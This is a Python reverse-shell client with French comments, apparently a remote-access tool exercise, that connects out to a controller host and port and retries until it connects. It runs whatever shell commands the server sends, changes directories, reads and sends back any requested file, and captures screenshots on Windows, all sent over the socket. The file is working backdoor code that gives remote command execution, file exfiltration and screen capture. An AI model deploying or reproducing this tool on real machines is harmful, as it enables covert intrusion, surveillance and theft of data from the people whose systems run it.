import os
import platform
import socket
import time
import subprocess
from PIL import ImageGrab

HOST_IP = "127.0.0.1"
HOST_PORT = 36000
MAX_DATA_SIZE = 1024

print(f"Connexion au serveur {HOST_IP}, port {HOST_PORT}")
while True:
    try:
        s = socket.socket()
        s.connect((HOST_IP, HOST_PORT))
    except ConnectionRefusedError:
        print("ERREUR : impossible de se connecter au serveur. Reconnexion...")
        time.sleep(4)
    else:
        print("Connecté au serveur")
        break

# ....
while True:
    cmd = s.recv(MAX_DATA_SIZE)
    if not cmd:
        break
    commande = cmd.decode()
    commande_split = commande.split(" ")
    if commande == "infos":
        reponse = platform.platform() + " " + os.getcwd()
        reponse = reponse.encode()
    elif len(commande_split) == 2 and commande_split[0] == "cd":
        try:
            os.chdir(commande_split[1].strip("'"))
            reponse = " "
        except FileNotFoundError:
            reponse = "ERROR: Repository Not found"
        reponse = reponse.encode()
    elif len(commande_split) == 2 and commande_split[0] == "dl":
        try:
            f = open(commande_split[1], 'rb')
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()
    elif len(commande_split) == 2 and commande_split[0] == "cp":
        if platform.system() == "Windows":
            cp = ImageGrab.grab()
            cp_filename = commande_split[1] + ".png"
            cp.save(cp_filename,"PNG")
            i = open(cp_filename,'rb')
            # os.system(f'gnome-screenshot  --file={commande_split[1]}.png')
            # # print(img)
            # i = open(commande_split[1] + ".png", 'rb')        
        reponse = i.read()
        print(reponse)
        i.close()

    else:
        res = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)  # dir sur PC
        reponse = res.stdout + res.stderr
        if not reponse or len(reponse) == 0:
            reponse = " "
        reponse = reponse.encode()

        # reponse est déjà encodé
    data_len = len(reponse)
    
    header = str(data_len).zfill(13)
    
    s.sendall(header.encode())
    if data_len > 0:
        s.sendall(reponse)

s.close()
